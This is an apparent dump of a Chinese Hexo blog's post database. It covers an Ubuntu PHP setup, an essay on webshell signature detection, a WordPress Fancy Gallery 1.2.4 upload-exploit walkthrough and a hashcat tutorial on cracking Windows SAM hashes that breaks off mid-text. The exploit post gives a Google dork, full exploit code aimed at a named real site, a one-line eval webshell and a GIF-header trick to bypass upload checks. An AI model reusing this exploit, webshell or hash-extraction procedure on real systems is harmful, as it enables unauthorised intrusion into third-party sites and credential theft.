01:17:16的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-011716的屏幕截图.png)\n\n然后在你的用户目录下的workspac/web下面写个php文件测试下看看是否正常。\n\n当然还有最后一个配置就是虚拟目录，如果经常输入localhost或者一些项目中需要配置一些域名，而测试的话又经常需要改来改去的\n\n因此我是习惯性的在hosts做本地域名解析，然后绑定虚拟目录。例如test.com 是我们项目用到的域名，那么首先修改hosts文件做本地解析\n\n命令和内容如下：\n\n```shell\nsudo vim(或者gedit) /ect/hosts                   //本地域名解析就是靠它的\n```\n\n在文件中加入 127.0.0.1  test.com 如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-013902的屏幕截图.png \"2012-08-14 01:39:02的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-013902的屏幕截图.png)\n\n然后在/etc/apache2/sites-enabled/下面建立一个名为www.test.com的文件，最好直接复制一份0xxx开头的配置文件做修改就行\n\n取名为www.test.com方便识别和辨认。apache默认会加载/etc/apache2/sites-enabled目录下的所有配置文件\n\n文件内容如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014154的屏幕截图.png \"2012-08-14 01:41:54的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014154的屏幕截图.png)\n\n注意：\n>SeverName就是你要绑定的域名DocumentRoot是要绑定的目录，我直接绑定了/home/return/workspace/web/test文件夹\n\n如果不写入serverName的话test.com是无法解析到/home/return/workspace/web/test目录的\n\n在里面加入一个php探针文件如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014604的屏幕截图.png \"2012-08-14 01:46:04的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014604的屏幕截图.png)\n\n可以看到已经解析到对应的目录了。好了基本配置就这写，每个人的使用习惯和风格不一样，自己用多了就有了\n\n自己的使用习惯了，包括自己会了简化一些工作写一些自己的实用脚本等等。\n","slug":"ubuntu下都php开发环境架设","updated":1421659126000,"excerpt":"<p>今天重新装了ubuntu那么就吧过程记录下。</p>\n<p>打开终端，也就是命令提示符。</p>\n<p>我们先来最小化组建安装，按照自己的需求一步一步装其他扩展。命令提示符输入如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get <span class=\"operator\"><span class=\"keyword\">install</span> apache2 php5-mysql libapache2-<span class=\"keyword\">mod</span>-php5 mysql-<span class=\"keyword\">server</span></span></div></pre></td></tr></table></figure>\n\n<p>上面的命令是最小化组建安装amp也就是apache2 ,php5 和 mysql 在加上一个php的mysql扩展</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:23:50的屏幕截图\"></a><br>","_id":"itwf5335siwcl67d","comments":true,"layout":"post","photos":[],"link":""},{"title":"webshell高级查杀","id":16,"date":1341080009000,"tags":["z1no7frvtpmvidzr","jkk1hzi0kjnqyh4p","wl75syl90izjzing","pmsbkc1uw8i1zgx8"],"categories":["1bynalp69sca7b8g"],"content":"<h2 id=\"很多人一直注重于攻击，而轻视于防御。\">很多人一直注重于攻击，而轻视于防御。</h2>\n<blockquote>\n<p>攻击在于创新，防御在于全面。</p>\n<p>用计算机的术语来说，攻是个单线程任务，你单核cpu频率越高，则效果愈好。</p>\n<p>防则是个多线程任务，你cpu核心越多，则效果俞佳。</p>\n</blockquote>\n<h2 id=\"下面说webshell的查杀\">下面说webshell的查杀</h2>\n<ul>\n<li><p>其实和pc一样，如安卓的恶意捆绑木马 和linux的恶意镜像源。一样的道路，web也要过一遍，pc端杀毒也是几个阶段。</p>\n</li>\n<li><p>从最初的专杀到特征码查杀再到基于行为的查杀（启发式查杀），再到最近炒得火热的云查杀。</p>\n</li>\n<li><p>说句题外话：所谓的云查杀更像是基于网络的特征码查杀。</p>\n</li>\n<li><p>同理：服务器上的webshell查杀也需要走特征码的路线，在现在硬件水平高于网络通信带宽的情况下，特征码还是非常必要的，接下来的就是讲webshell的特征码问题。</p>\n<a id=\"more\"></a></li>\n<li><p>依据pc端病毒特征码的原理：根据执行文件如PE文件，从各个段提出多个特征码进行多对一的映射定位（这个主要是为了防止类此myccl之类的过免杀），这种提取的方式有很多种，大部分高效的做法还是经验丰富的病毒分析师凭经验定位特征码。</p>\n</li>\n<li><p>如PC端病毒特征码类似，但又不尽相同，pc端的病毒是以执行文件存在的，提取特征码只是在机器码-反汇编代码的基础上进行定位的。</p>\n</li>\n<li><p>而webshell是以源码的形式进行定位。机器码是最底层的语言，定的很死，比如我们od中常用的int3 就是0cch一一对应，不会再变。</p>\n</li>\n<li><p>而webshell使用高级脚本语言，高级语言的写法是存在多样性，如php中的各种字符串操作函数，这无疑增加了定位特征码的难度。</p>\n</li>\n<li><p>其实，现实是这样的对于大马的查杀是相对容易的，无论php，asp,.net的大马，他们中调用的一些函数是普通脚本代码不会用到，所以可以以这些特殊函数为正则匹配规则，进行匹配。（大部分的服务器安全软件也是这样做的）当然这样做的结果，会出现误杀的情况，因此要借用多重特征码进行匹配。一些做免杀的朋友，可能就笑了，这太好过了，直接做下字符串拆分，然后在连接，或者写个加解密，再或者加混淆代码轻松就过了。</p>\n</li>\n</ul>\n<ul>\n<li><p>这样理论上是对的，但是实际中忽略了电脑硬件的能力，对于2^32的运算一般配置的电脑也不会超过10秒，对于各种字符串加解密我们可以对与加解密运算的字符进行匹配，然后查杀设计要加入语义分析，如果学过编译原理的应该熟悉，对匹配到的字符串加减操作进行还原进行最终的匹配。</p>\n</li>\n<li><p>对于一句话木马的查杀则比较麻烦，因为变异的一句话木马有些是用的web应用程序正常调用的函数，再加上些变形，查杀是比较棘手，这种查杀则需要进行大量的样本收集，对其进行特征码提取。</p>\n</li>\n<li><p>特征码的提取可采用统计学中的采样方法，取一定数量的样本（包括正常样本和网马样本），对其进行异样提取，再对各类样本进行同样提取，再通过出现概率在进行添加。最终生成特征码样本。</p>\n</li>\n</ul>\n<p>这样基本对已知存在的一句话木马匹配到。</p>\n<p>对于特征码的匹配算法尚在测试中。</p>\n<p>欢迎提供更多的webshell样本.</p>\n<p>原创作者：livers   blog:   <a href=\"http://livers.sinaapp.com\" target=\"_blank\" rel=\"external\">http://livers.sinaapp.com</a></p>\n","source":"_posts/webshell高级查杀.md","raw":"title: \"webshell高级查杀\"\nid: 16\ndate: 2012-07-01 02:13:29\ntags: \n- Return\n- webshell\n- 入侵\n- 渗透\ncategories: \n- 技术文章\n---\n\n\n##很多人一直注重于攻击，而轻视于防御。\n\n>攻击在于创新，防御在于全面。\n\n>用计算机的术语来说，攻是个单线程任务，你单核cpu频率越高，则效果愈好。\n\n>防则是个多线程任务，你cpu核心越多，则效果俞佳。\n\n##下面说webshell的查杀\n\n- 其实和pc一样，如安卓的恶意捆绑木马 和linux的恶意镜像源。一样的道路，web也要过一遍，pc端杀毒也是几个阶段。\n\n- 从最初的专杀到特征码查杀再到基于行为的查杀（启发式查杀），再到最近炒得火热的云查杀。\n\n- 说句题外话：所谓的云查杀更像是基于网络的特征码查杀。\n\n- 同理：服务器上的webshell查杀也需要走特征码的路线，在现在硬件水平高于网络通信带宽的情况下，特征码还是非常必要的，接下来的就是讲webshell的特征码问题。\n<!--more-->\n- 依据pc端病毒特征码的原理：根据执行文件如PE文件，从各个段提出多个特征码进行多对一的映射定位（这个主要是为了防止类此myccl之类的过免杀），这种提取的方式有很多种，大部分高效的做法还是经验丰富的病毒分析师凭经验定位特征码。\n\n- 如PC端病毒特征码类似，但又不尽相同，pc端的病毒是以执行文件存在的，提取特征码只是在机器码-反汇编代码的基础上进行定位的。\n\n- 而webshell是以源码的形式进行定位。机器码是最底层的语言，定的很死，比如我们od中常用的int3 就是0cch一一对应，不会再变。\n\n- 而webshell使用高级脚本语言，高级语言的写法是存在多样性，如php中的各种字符串操作函数，这无疑增加了定位特征码的难度。\n\n- 其实，现实是这样的对于大马的查杀是相对容易的，无论php，asp,.net的大马，他们中调用的一些函数是普通脚本代码不会用到，所以可以以这些特殊函数为正则匹配规则，进行匹配。（大部分的服务器安全软件也是这样做的）当然这样做的结果，会出现误杀的情况，因此要借用多重特征码进行匹配。一些做免杀的朋友，可能就笑了，这太好过了，直接做下字符串拆分，然后在连接，或者写个加解密，再或者加混淆代码轻松就过了。\n\n\n- 这样理论上是对的，但是实际中忽略了电脑硬件的能力，对于2^32的运算一般配置的电脑也不会超过10秒，对于各种字符串加解密我们可以对与加解密运算的字符进行匹配，然后查杀设计要加入语义分析，如果学过编译原理的应该熟悉，对匹配到的字符串加减操作进行还原进行最终的匹配。\n\n- 对于一句话木马的查杀则比较麻烦，因为变异的一句话木马有些是用的web应用程序正常调用的函数，再加上些变形，查杀是比较棘手，这种查杀则需要进行大量的样本收集，对其进行特征码提取。\n\n- 特征码的提取可采用统计学中的采样方法，取一定数量的样本（包括正常样本和网马样本），对其进行异样提取，再对各类样本进行同样提取，再通过出现概率在进行添加。最终生成特征码样本。\n\n这样基本对已知存在的一句话木马匹配到。\n\n对于特征码的匹配算法尚在测试中。\n\n欢迎提供更多的webshell样本.\n\n原创作者：livers   blog:   http://livers.sinaapp.com\n","slug":"webshell高级查杀","updated":1421659126000,"excerpt":"<h2 id=\"很多人一直注重于攻击，而轻视于防御。\">很多人一直注重于攻击，而轻视于防御。</h2>\n<blockquote>\n<p>攻击在于创新，防御在于全面。</p>\n<p>用计算机的术语来说，攻是个单线程任务，你单核cpu频率越高，则效果愈好。</p>\n<p>防则是个多线程任务，你cpu核心越多，则效果俞佳。</p>\n</blockquote>\n<h2 id=\"下面说webshell的查杀\">下面说webshell的查杀</h2>\n<ul>\n<li><p>其实和pc一样，如安卓的恶意捆绑木马 和linux的恶意镜像源。一样的道路，web也要过一遍，pc端杀毒也是几个阶段。</p>\n</li>\n<li><p>从最初的专杀到特征码查杀再到基于行为的查杀（启发式查杀），再到最近炒得火热的云查杀。</p>\n</li>\n<li><p>说句题外话：所谓的云查杀更像是基于网络的特征码查杀。</p>\n</li>\n<li><p>同理：服务器上的webshell查杀也需要走特征码的路线，在现在硬件水平高于网络通信带宽的情况下，特征码还是非常必要的，接下来的就是讲webshell的特征码问题。</p>\n","_id":"cmezltyaprjjc9f0","comments":true,"layout":"post","photos":[],"link":""},{"title":"Wordpress Fancy Gallery Plugin 1.2.4 漏洞利用","id":83,"date":1341161398000,"tags":["x2oej1diwv58fip4"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>睡觉前习惯性的上<a href=\"http://www.exploit-db.com/看看有没有什么新出的漏洞，\" target=\"_blank\" rel=\"external\">http://www.exploit-db.com/看看有没有什么新出的漏洞，</a></p>\n<p>刚好看到一个Wordpress Fancy Gallery Plugin 1.2.4的上传漏洞</p>\n<p>额，其实如果是注入漏洞的话我就不看了，上传漏洞一般就是直接能够上传自己的shell后门，这样比较省事。</p>\n<p>先找一个有fancy gallery plugin的漏洞网站，google关键词：inurl:/wp-content/plugins/radykal-fancy-gallery/</p>\n<p>随便点击一个进去看了看：<a href=\"http://progressivepulse.com\" target=\"_blank\" rel=\"external\">http://progressivepulse.com</a> 发现这个网站确实存在此插件并且有列目录漏洞</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro1.png\" alt=\"\" title=\"pro1\"></a><br><a id=\"more\"></a><br>可以看到目录中的文件。</p>\n<p>下载网站上面的exp  PHP的：<a href=\"http://www.exploit-db.com/exploits/19398/\" target=\"_blank\" rel=\"external\">http://www.exploit-db.com/exploits/19398/</a></p>\n<p>代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">##################################################</span></div><div class=\"line\"><span class=\"comment\"># Description : Wordpress Plugins - Fancy Gallery Arbitrary File Upload Vulnerability</span></div><div class=\"line\"><span class=\"comment\"># Version : 1.2.4</span></div><div class=\"line\"><span class=\"comment\"># link : http://codecanyon.net/item/fancy-gallery-wordpress-plugin/400535</span></div><div class=\"line\"><span class=\"comment\"># Price : 18$</span></div><div class=\"line\"><span class=\"comment\"># Date : 22-06-2012</span></div><div class=\"line\"><span class=\"comment\"># Google Dork : inurl:/wp-content/plugins/radykal-fancy-gallery/</span></div><div class=\"line\"><span class=\"comment\"># Site : 1337day.com Inj3ct0r Exploit Database</span></div><div class=\"line\"><span class=\"comment\"># Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr</span></div><div class=\"line\"><span class=\"comment\">##################################################</span></div><div class=\"line\"></div><div class=\"line\">Exploit :</div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$uploadfile</span>=&quot;lo.php&quot;;   <span class=\"comment\">//$uploadfile=&quot;lo.php.gif&quot;; 原来的名字</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$ch</span> =</div><div class=\"line\">curl_init(&quot;http:<span class=\"comment\">//progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php&quot;);</span></div><div class=\"line\"></div><div class=\"line\">curl_setopt(<span class=\"variable\">$ch</span>, CURLOPT_POST, <span class=\"keyword\">true</span>);</div><div class=\"line\">curl_setopt(<span class=\"variable\">$ch</span>, CURLOPT_POSTFIELDS, <span class=\"keyword\">array</span>(<span class=\"string\">'file[]'</span>=&gt;&quot;@<span class=\"variable\">$uploadfile</span>&quot;));</div><div class=\"line\">curl_setopt(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</div><div class=\"line\"><span class=\"variable\">$postResult</span> = curl_exec(<span class=\"variable\">$ch</span>);</div><div class=\"line\">curl_close(<span class=\"variable\">$ch</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> &quot;<span class=\"variable\">$postResult</span>&quot;;</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>看下代码说明：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">curl_init(<span class=\"string\">\"http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php\"</span>);</div></pre></td></tr></table></figure>\n\n<p>这个是目标地址，把你找到的网址替换到就可以了</p>\n<p>根据代码提示需要上传一个后门文件lo.php.gif</p>\n<p>那好吧就上传一句话</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cmd'</span>]);<span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>运行exp : php exp.php</p>\n<p>结果悲剧的发现提示非图片文件 file is not a image:</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro2.png\" alt=\"\" title=\"pro2\"></a></p>\n<p>好吧那就上图马吧，图马我向大家都知道我就不多说了。再次上传，提示成功，但是接下来心拔凉拔凉的，看到</p>\n<p>提示说上传确实成功了但你上传上去的还是是gif格式的文件你让我情何以堪。本以为会自动重命名为php…</p>\n<p>本站点又不是nigx更不存在那个解析漏洞~~  放弃？肯定不愿意么。那好吧，试试直接上传php文件，结果提示</p>\n<p>也是上面的那个非图片文件。头部加入图片的头文件能跳过验证不，试试头部加入gif图片的头部信息：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro3.png\" alt=\"\" title=\"pro3\"></a></p>\n<p>然后再次上传试试看看成功与否：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro4.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro4.png\" alt=\"\" title=\"pro4\"></a></p>\n<p>看到图片上面提示成功，并且是php的文件。那么菜刀连接看看~~</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro5.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro5.png\" alt=\"\" title=\"pro5\"></a></p>\n<p>看到这里，不用我再说了吧。ok 后面的你们懂得。</p>\n","source":"_posts/wordpress-fancy-gallery-plugin-1-2-4-漏洞利用.md","raw":"title: \"Wordpress Fancy Gallery Plugin 1.2.4 漏洞利用\"\nid: 83\ndate: 2012-07-02 00:49:58\ntags: \n- wordpress漏洞\ncategories: \n- 原创作品\n- 技术文章\n---\n\n睡觉前习惯性的上http://www.exploit-db.com/看看有没有什么新出的漏洞，\n\n刚好看到一个Wordpress Fancy Gallery Plugin 1.2.4的上传漏洞\n\n额，其实如果是注入漏洞的话我就不看了，上传漏洞一般就是直接能够上传自己的shell后门，这样比较省事。\n\n先找一个有fancy gallery plugin的漏洞网站，google关键词：inurl:/wp-content/plugins/radykal-fancy-gallery/\n\n随便点击一个进去看了看：http://progressivepulse.com 发现这个网站确实存在此插件并且有列目录漏洞\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/pro1.png \"pro1\")](http://asset.creturn.com/asset/uploads/2012/07/pro1.png)\n<!--more-->\n可以看到目录中的文件。\n\n下载网站上面的exp  PHP的：http://www.exploit-db.com/exploits/19398/\n\n代码：\n\n```php\n\n##################################################\n# Description : Wordpress Plugins - Fancy Gallery Arbitrary File Upload Vulnerability\n# Version : 1.2.4\n# link : http://codecanyon.net/item/fancy-gallery-wordpress-plugin/400535\n# Price : 18$\n# Date : 22-06-2012\n# Google Dork : inurl:/wp-content/plugins/radykal-fancy-gallery/\n# Site : 1337day.com Inj3ct0r Exploit Database\n# Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr\n##################################################\n\nExploit :\n\n<?php\n\n$uploadfile=&quot;lo.php&quot;;   //$uploadfile=&quot;lo.php.gif&quot;; 原来的名字\n\n$ch =\ncurl_init(&quot;http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php&quot;);\n\ncurl_setopt($ch, CURLOPT_POST, true);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, array('file[]'=&gt;&quot;@$uploadfile&quot;));\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$postResult = curl_exec($ch);\ncurl_close($ch);\n\nprint &quot;$postResult&quot;;\n?>\n\n```\n\n看下代码说明：\n\n```php\n\ncurl_init(\"http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php\");\n```\n\n这个是目标地址，把你找到的网址替换到就可以了\n\n根据代码提示需要上传一个后门文件lo.php.gif\n\n那好吧就上传一句话\n\n```php\n<?php @eval($_POST['cmd']);?>\n```\n\n运行exp : php exp.php\n\n结果悲剧的发现提示非图片文件 file is not a image:\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/pro2.png \"pro2\")](http://asset.creturn.com/asset/uploads/2012/07/pro2.png)\n\n好吧那就上图马吧，图马我向大家都知道我就不多说了。再次上传，提示成功，但是接下来心拔凉拔凉的，看到\n\n提示说上传确实成功了但你上传上去的还是是gif格式的文件你让我情何以堪。本以为会自动重命名为php...\n\n本站点又不是nigx更不存在那个解析漏洞~~  放弃？肯定不愿意么。那好吧，试试直接上传php文件，结果提示\n\n也是上面的那个非图片文件。头部加入图片的头文件能跳过验证不，试试头部加入gif图片的头部信息：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/pro3.png \"pro3\")](http://asset.creturn.com/asset/uploads/2012/07/pro3.png)\n\n然后再次上传试试看看成功与否：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/pro4.png \"pro4\")](http://asset.creturn.com/asset/uploads/2012/07/pro4.png)\n\n看到图片上面提示成功，并且是php的文件。那么菜刀连接看看~~\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/pro5.png \"pro5\")](http://asset.creturn.com/asset/uploads/2012/07/pro5.png)\n\n看到这里，不用我再说了吧。ok 后面的你们懂得。\n","slug":"wordpress-fancy-gallery-plugin-1-2-4-漏洞利用","updated":1421659126000,"excerpt":"<p>睡觉前习惯性的上<a href=\"http://www.exploit-db.com/看看有没有什么新出的漏洞，\" target=\"_blank\" rel=\"external\">http://www.exploit-db.com/看看有没有什么新出的漏洞，</a></p>\n<p>刚好看到一个Wordpress Fancy Gallery Plugin 1.2.4的上传漏洞</p>\n<p>额，其实如果是注入漏洞的话我就不看了，上传漏洞一般就是直接能够上传自己的shell后门，这样比较省事。</p>\n<p>先找一个有fancy gallery plugin的漏洞网站，google关键词：inurl:/wp-content/plugins/radykal-fancy-gallery/</p>\n<p>随便点击一个进去看了看：<a href=\"http://progressivepulse.com\" target=\"_blank\" rel=\"external\">http://progressivepulse.com</a> 发现这个网站确实存在此插件并且有列目录漏洞</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/pro1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/pro1.png\" alt=\"\" title=\"pro1\"></a><br>","_id":"o25p37uy9qa4y6c8","comments":true,"layout":"post","photos":[],"link":""},{"title":"利用GPU运算工具hashcat爆破window密码","id":258,"date":1353819347000,"tags":["tcais1x2iadfin93","w1ijt0t2396whe1q"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>今天介绍一款利用显卡超强运算能力进行爆破密码的工具hashcat，用它来进行爆破window密码</p>\n<p>当然他支持的不仅仅是window SAM密码的爆破。</p>\n<p>我本机环境和显卡信息如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png\" alt=\"224255j1foiui0lrc10rsh\"></a></p>\n<a id=\"more\"></a>\n\n<p>hashcat的下载地址为：<a href=\"http://hashcat.net/files_legacy/hashcat-0.40.7z\" target=\"_blank\" rel=\"external\">http://hashcat.net/files_legacy/hashcat-0.40.7z</a> 这个为非gui，如果需要gui的可以去官网下载gui版本</p>\n<p>解压后可以看到如图内容：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224256bl2n8535y5pvl87n.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224256bl2n8535y5pvl87n.png\" alt=\"224256bl2n8535y5pvl87n\"></a></p>\n<p>其中window和linux对应的版本都有。我是64位ubuntu 那么就用hashcat-cli64.bin</p>\n<p>为了方便使用我做了一个软链接：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ln -s <span class=\"regexp\">/home/</span><span class=\"keyword\">return</span><span class=\"regexp\">/soft/</span>hack<span class=\"regexp\">/hashcat/</span>hashcat-cli64.bin <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/hashcat</span></div></pre></td></tr></table></figure>\n\n<p>这样打开终端后不管在什么位置直接输入hashcat就行了，看看它支持的密码类型：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224300uew6cie9zieq7cbq.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224300uew6cie9zieq7cbq.png\" alt=\"224300uew6cie9zieq7cbq\"></a></p>\n<p>其中红色部分就是sam加密类型</p>\n<p>我们先看看hashcat的运算能力怎么。我们用php的md5加密6个z试试看看它进行爆破速度怎么样：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">\tfile_put_contents(<span class=\"string\">'hashcat.txt'</span>,md5(<span class=\"string\">'zzzzzz'</span>);</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>上面代码保存成x.php ,终端下php x.php 会在当前目录下生成hashcat.txt 里面就保存了zzzzz的md5值：</p>\n<p>453e41d218e071ccfb2d1c99ce23906a</p>\n<p>然后终端输入：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">time</span> hashcat -<span class=\"operator\">a</span> <span class=\"number\">3</span> -m <span class=\"number\">0</span> hashcat.txt ?l?l?l?l?l?l</div></pre></td></tr></table></figure>\n\n<p>解释下命令：time 用来统计执行这条命令耗费的时间，-a 是破解模式 -m 密码类型 后面的？l 是密码的配置符号。？l为小写字符a-z</p>\n<p>结果如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224303cnhu6wowugpmlpm6.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224303cnhu6wowugpmlpm6.png\" alt=\"224303cnhu6wowugpmlpm6\"></a></p>\n<p>可以看到我标记出来的：</p>\n<p>1.当前的匹配模式  2.破解结果 3.time 计算出耗费的时间</p>\n<p>可以看到穷举6位字母用时14秒效果已经很不错了。当然这个也跟自己的显卡性能有关</p>\n<p>接下来回到正题，看看如果破解window密码。破解之前我们还需要两个工具bkhive,和samdump2</p>\n<p>ubuntu下执行如下命令即可安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">sudo</span> apt-get install bkhive</div></pre></td></tr></table></figure>\n\n<p>好了。继续，看下我的分区情况。因为现在在ubuntu下我的window在c盘第一分区上装着，如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224307iz3gs432za1vawbx.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224307iz3gs432za1vawbx.png\" alt=\"224307iz3gs432za1vawbx\"></a></p>\n<p>挂在sda1分区到我的/win</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir <span class=\"regexp\">/win &amp; mount /</span>dev<span class=\"regexp\">/sda1 /</span>win</div></pre></td></tr></table></figure>\n\n<p>上面命令是在根目录下创建win文件夹并且挂载sda1</p>\n<p>看看win下是否挂载成功，如果成功了，可以看到win目录下有window系统c盘（系统盘）的内容</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224310ayqj3g611m6tgy11.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224310ayqj3g611m6tgy11.png\" alt=\"224310ayqj3g611m6tgy11\"></a></p>\n<p>拷贝：cp /win/Windows/System32/config/SYSTEM  和SAM 文件到当前文件夹</p>\n<p>然后执行命令如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg.png\" alt=\"224313ubvwmmtwwfyxlttg\"></a></p>\n<p>命令解释：</p>\n<blockquote>\n<p>1和2是拷贝 SYSTEM和SAM到当前文件夹</p>\n<p>3.根据SYSTEM文件提取bootkey</p>\n<p>4.利用bootkey提取出hash值</p>\n</blockquote>\n<p>提取出来的哈是值如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd.png\" alt=\"224314lf5dy5dq3b95zkkd\"></a></p>\n<p>window的hash密文其实就是最后两个‘：’号之间的数据，到这里拿到值后其实就可以去网上看下有已经破解的密文了没</p>\n<p>可以看如图，已经找到密码了：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224317qpwypa77l2gly2zv.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224317qpwypa77l2gly2zv.png\" alt=\"224317qpwypa77l2gly2zv\"></a></p>\n<p>那么接下来我们爆破。取出密文，也就是最后两个‘：’之间的数据保存为pwd.txt</p>\n<p>执行如下图命令：</p>\n<p><a 